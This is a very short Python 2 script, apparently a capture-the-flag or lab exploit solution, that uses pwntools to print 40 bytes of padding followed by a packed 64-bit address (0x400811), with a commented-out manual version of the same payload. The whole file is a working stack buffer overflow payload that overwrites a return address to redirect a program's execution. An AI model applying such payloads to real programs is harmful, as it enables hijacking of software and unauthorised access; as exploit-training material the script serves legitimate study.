import pwn
junk = "X"*40

spot = pwn.p64(0x0000000000400811)

print junk + spot
#print "A"*40 + "\x11\x08\x40\x00\x00\x00\x00\x00\x00"
